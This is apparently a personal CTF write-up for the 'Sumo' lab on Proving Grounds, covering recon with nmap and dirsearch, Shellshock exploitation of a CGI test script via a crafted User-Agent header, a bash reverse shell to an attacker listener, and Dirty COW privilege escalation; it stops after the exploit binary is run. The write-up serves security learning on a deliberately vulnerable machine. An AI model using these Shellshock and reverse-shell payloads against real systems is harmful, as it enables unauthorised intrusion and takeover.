---
title: Writeup for Lab SUMO (Proving Grounds
categories:
  - Bug Bounty
  - Projects
summary: This is the writeup for sumo lab from proving grounds 
created: 2023-07-20
lastmod: 2023-07-20
---

## Introduction
Sumo is a machine available on vulnhub and offsec proving grounds labeled **easy** and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted. 

## Recon
After getting the IP of the machine, ran a basic nmap scan on the target machine: 
```bash
nmap -Pn -sV -T4 192.168.1.48
```

The disovered open ports are `80` and `22`. Lets visit the website first. 

Next thing, i brute forced into the website using `dirsearch`: 
```
python3 dirsearch --url https://192.168.1.120
```

I found the `CGI-BIN` endpoint. And from the nmap output, we know the version of apache is `2.2.22` which is quite an old version.

## Exploitation
### Initial Access

Now, duringthe brute force phase, i also discovered the `test` script under the `CGI-BIN` folder. Since, we know the system is old, lets try the famous `ShellShock` exploit: 
```
curl -H ‘User-Agent: () { :; }; whoami; pwd; pwd’ http://192.168.124.87/cgi-bin/test.sh
```

And we got the output back. Lets escalate it to a shell: 
```
## Listening
nc -lvnp 555

## Target execution
curl -H ‘User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/555 0>&1’ http://192.168.XX.XX/cgi-bin/test.sh
```

And we got the shell. Our first flag is in `local.txt` file:
```
cat ./local.txt
```

### Privilege Escalation
Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first: 
```
hostnamectl  ## Game me no output
uname -a
```

Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was `dirtycow`. Lets get a public version of it. Compiling it: 
```
gcc dirtycow.c -o dcow -pthread -static
```

I used the `-static` flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on `Kali 2023.1`. Lets execute the binary: 
```
chmod +x ./dcow
./dcow
```

